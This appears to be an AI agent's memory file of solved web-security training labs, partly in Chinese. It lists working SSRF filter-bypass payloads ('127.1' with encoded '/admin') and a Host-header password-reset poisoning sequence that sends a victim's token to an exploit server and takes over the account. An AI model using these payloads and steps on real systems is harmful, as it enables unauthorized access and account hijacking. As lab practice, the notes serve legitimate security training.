---
metadata:
  node_type: memory
name: "Web Lab Solves"
description: "2026-10-10: solved lab-host-header-basic-password-reset-poisoning via Host override on /forgot-password; http_session --header 'Host:' does override Host."
last_updated: 2026-10-11T00:53:53+08:00
created: 2026-10-10T12:46:51+08:00
---

## 2026-02-12 — lab-ssrf-with-blacklist-filter (arm A, solved 首次投递)

- 实例: https://0a9100cb039c6216802b1282004a007c.web-security-academy.net/ (reused:false), jar /tmp/cj1.json
- 注入点: POST /product/stock, 字段 `stockApi`(JSON 里是字符串 URL)。
- 两道弱防御实测边界(form_sweep 一轮 12 候选即定位):
  - 主机黑名单: `localhost`、`127.0.0.1` 命中 -> 400 "External stock check blocked for security reasons";`127.1` 不被拦(短形回环)。
  - 路径黑名单: 字面 `/admin`(小写)命中;`/admin/`、`//admin`、`/%2fadmin` 也被拦(说明拦截发生在解码后的路径上或对分隔符做了归一)。
  - 通过者: `http://127.1/%61dmin` 与 `http://127.1/ADMIN` 均 200 返回内网 admin 页(3178B);`%2561dmin` 404(过度编码,取回的路径不是 /admin)。
- 利用: `stockApi=http://127.1/%61dmin/delete?username=carlos` -> 302 Location: /admin;banner_verdict solved:true。
- 方法要点: 单查表 URL 上的 SSRF,先扫「主机形 x 路径编码/大小写」面盘一次投递;编码层数要按回执(404 vs 200)校准,别凭记忆定 %25 层数。


## 2026-10-10

## 2026-10-10 lab-host-header-basic-password-reset-poisoning (arm A, solved)

- Instance: 0ada001c03d6e9ee808f62f700ea0035.web-security-academy.net; exploit server read from the login page's `exploit-link` href (range_launch reported exploit_server:null).
- Method: GET /forgot-password for csrf -> POST /forgot-password with `username=carlos` plus `--header 'Host: exploit-...exploit-server.net'`. ureq DOES send a caller Host override - the emailed reset link carried the exploit host and the victim click landed the token in the exploit server access log (`GET /forgot-password?temp-forgot-password-token=... 404`, UA "Victim").
- Then GET the reset URL on the lab with the stolen token (csrf + hidden temp-forgot-password-token), POST new passwords, log in as carlos:hacked123. Banner: "Congratulations, you solved the lab!".

